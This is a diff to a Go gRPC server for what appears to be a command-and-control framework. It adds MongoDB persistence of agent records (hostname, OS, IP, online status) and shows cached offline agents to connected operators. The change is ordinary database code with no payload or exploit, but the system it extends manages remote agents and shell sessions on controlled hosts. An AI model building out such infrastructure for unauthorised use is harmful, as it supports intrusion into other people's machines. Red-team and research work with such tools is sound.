@@ -31,6 +31,17 @@ type Agent struct {
 	LastSeen time.Time
 }
 
+type AgentRecord struct {
+	AgentID   string    `bson:"agent_id"`
+	Hostname  string    `bson:"hostname"`
+	OS        string    `bson:"os"`
+	IP        string    `bson:"ip"`
+	Status    string    `bson:"status"`
+	LastSeen  time.Time `bson:"last_seen"`
+	IsOnline  bool      `bson:"is_online"`
+	UpdatedAt time.Time `bson:"updated_at"`
+}
+
 type TaskExecution struct {
 	TaskID      string    `bson:"task_id"`
 	AgentID     string    `bson:"agent_id"`
@@ -118,6 +129,7 @@ var (
 
 	mongoClient       *mongo.Client
 	historyCollection *mongo.Collection
+	agentCollection   *mongo.Collection
 )
 
 type agentServer struct {
@@ -223,6 +235,7 @@ func removeAgentAndBroadcast(agentID string) {
 	if !ok {
 		return
 	}
+	markAgentOffline(agentID, hostname)
 
 	go broadcastToOperators(&pb.OperatorEvent{
 		Type:    "agent_removed",
@@ -396,19 +409,20 @@ func closeShellSessionsForAgent(agentID string) {
 	}
 }
 
-func connectMongo(ctx context.Context) (*mongo.Client, *mongo.Collection, error) {
+func connectMongo(ctx context.Context) (*mongo.Client, *mongo.Collection, *mongo.Collection, error) {
 	client, err := mongo.Connect(ctx, options.Client().ApplyURI("mongodb://localhost:27017"))
 	if err != nil {
-		return nil, nil, err
+		return nil, nil, nil, err
 	}
 
 	if err := client.Ping(ctx, nil); err != nil {
 		_ = client.Disconnect(context.Background())
-		return nil, nil, err
+		return nil, nil, nil, err
 	}
 
-	collection := client.Database("c2_grpc").Collection("command_history")
-	_, err = collection.Indexes().CreateOne(ctx, mongo.IndexModel{
+	db := client.Database("c2_grpc")
+	history := db.Collection("command_history")
+	_, err = history.Indexes().CreateOne(ctx, mongo.IndexModel{
 		Keys: bson.D{
 			{Key: "agent_id", Value: 1},
 			{Key: "executed_at", Value: -1},
@@ -416,10 +430,20 @@ func connectMongo(ctx context.Context) (*mongo.Client, *mongo.Collection, error)
 	})
 	if err != nil {
 		_ = client.Disconnect(context.Background())
-		return nil, nil, err
+		return nil, nil, nil, err
 	}
 
-	return client, collection, nil
+	agents := db.Collection("agents")
+	_, err = agents.Indexes().CreateOne(ctx, mongo.IndexModel{
+		Keys:    bson.D{{Key: "agent_id", Value: 1}},
+		Options: options.Index().SetUnique(true),
+	})
+	if err != nil {
+		_ = client.Disconnect(context.Background())
+		return nil, nil, nil, err
+	}
+
+	return client, history, agents, nil
 }
 
 func trackTask(agentID string, task pb.Task) {
@@ -432,6 +456,85 @@ func trackTask(agentID string, task pb.Task) {
 		ExecutedAt: time.Now(),
 	}
 	taskRecordsMu.Unlock()
+}
+
+func upsertAgentRecord(agentID string, agent *Agent, isOnline bool) {
+	if agentCollection == nil || agent == nil {
+		return
+	}
+
+	doc := bson.M{
+		"agent_id":   agentID,
+		"hostname":   agent.Hostname,
+		"os":         agent.OS,
+		"ip":         agent.IP,
+		"status":     agent.Status,
+		"last_seen":  agent.LastSeen,
+		"is_online":  isOnline,
+		"updated_at": time.Now(),
+	}
+
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
+
+	_, err := agentCollection.UpdateOne(
+		ctx,
+		bson.M{"agent_id": agentID},
+		bson.M{"$set": doc},
+		options.Update().SetUpsert(true),
+	)
+	if err != nil {
+		log.Printf("[server] agent upsert error for %s: %v", agentID, err)
+	}
+}
+
+func markAgentOffline(agentID string, hostname string) {
+	if agentCollection == nil || agentID == "" {
+		return
+	}
+
+	update := bson.M{
+		"status":     "OFFLINE",
+		"is_online":  false,
+		"updated_at": time.Now(),
+	}
+	if hostname != "" {
+		update["hostname"] = hostname
+	}
+
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
+
+	_, err := agentCollection.UpdateOne(
+		ctx,
+		bson.M{"agent_id": agentID},
+		bson.M{"$set": update},
+	)
+	if err != nil {
+		log.Printf("[server] mark agent offline error for %s: %v", agentID, err)
+	}
+}
+
+func loadKnownAgents(ctx context.Context) ([]AgentRecord, error) {
+	if agentCollection == nil {
+		return nil, nil
+	}
+
+	cursor, err := agentCollection.Find(
+		ctx,
+		bson.M{},
+		options.Find().SetSort(bson.D{{Key: "updated_at", Value: -1}}),
+	)
+	if err != nil {
+		return nil, err
+	}
+	defer cursor.Close(ctx)
+
+	var docs []AgentRecord
+	if err := cursor.All(ctx, &docs); err != nil {
+		return nil, err
+	}
+	return docs, nil
 }
 
 func persistTaskHistory(taskID string) {
@@ -534,6 +637,7 @@ func (s *agentServer) Register(ctx context.Context, req *pb.RegisterRequest) (*p
 		Status:   "ALIVE",
 		LastSeen: time.Now(),
 	}
+	upsertAgentRecord(machineID, agents[machineID], true)
 
 	tasksMu.Lock()
 	if _, exists := tasks[machineID]; !exists {
@@ -558,6 +662,7 @@ func (s *agentServer) Unregister(ctx context.Context, req *pb.UnregisterRequest)
 	if !ok {
 		return nil, status.Error(codes.NotFound, "agent not found")
 	}
+	markAgentOffline(req.GetAgentId(), hostname)
 
 	go broadcastToOperators(&pb.OperatorEvent{
 		Type:    "agent_removed",
@@ -600,6 +705,7 @@ func (s *heartbeatServer) SendHeartbeat(stream pb.HeartbeatService_SendHeartbeat
 		if agent, ok := agents[agentID]; ok {
 			agent.Status = normalizeStatus(req.GetStatus())
 			agent.LastSeen = time.Now()
+			upsertAgentRecord(agentID, agent, true)
 		}
 		agentsMu.Unlock()
 
@@ -708,12 +814,13 @@ func (s *operatorServer) Connect(stream pb.OperatorService_ConnectServer) error 
 		id       string
 		hostname string
 		status   string
+		ip       string
 	}
 
 	agentsMu.RLock()
 	roster := make([]rosterEntry, 0, len(agents))
 	for id, agent := range agents {
-		roster = append(roster, rosterEntry{id: id, hostname: agent.Hostname, status: agent.Status})
+		roster = append(roster, rosterEntry{id: id, hostname: agent.Hostname, status: agent.Status, ip: agent.IP})
 	}
 	agentsMu.RUnlock()
 
@@ -721,9 +828,33 @@ func (s *operatorServer) Connect(stream pb.OperatorService_ConnectServer) error 
 		if err := stream.Send(&pb.OperatorEvent{
 			Type:    "agent_joined",
 			AgentId: agent.id,
-			Payload: fmt.Sprintf("%s [%s]", agent.hostname, agent.status),
+			Payload: fmt.Sprintf("%s @ %s [%s]", agent.hostname, agent.ip, agent.status),
 		}); err != nil {
 			return err
+		}
+	}
+
+	queryCtx, cancel := context.WithTimeout(stream.Context(), 5*time.Second)
+	knownAgents, err := loadKnownAgents(queryCtx)
+	cancel()
+	if err != nil {
+		log.Printf("[server] load known agents error: %v", err)
+	} else {
+		live := make(map[string]struct{}, len(roster))
+		for _, agent := range roster {
+			live[agent.id] = struct{}{}
+		}
+		for _, agent := range knownAgents {
+			if _, ok := live[agent.AgentID]; ok {
+				continue
+			}
+			if err := stream.Send(&pb.OperatorEvent{
+				Type:    "agent_cached",
+				AgentId: agent.AgentID,
+				Payload: fmt.Sprintf("%s @ %s [OFFLINE]", agent.Hostname, agent.IP),
+			}); err != nil {
+				return err
+			}
 		}
 	}
 
@@ -1118,7 +1249,7 @@ func main() {
 	defer cancelMongo()
 
 	var err error
-	mongoClient, historyCollection, err = connectMongo(mongoCtx)
+	mongoClient, historyCollection, agentCollection, err = connectMongo(mongoCtx)
 	if err != nil {
 		log.Fatalf("mongo connect error: %v", err)
 	}
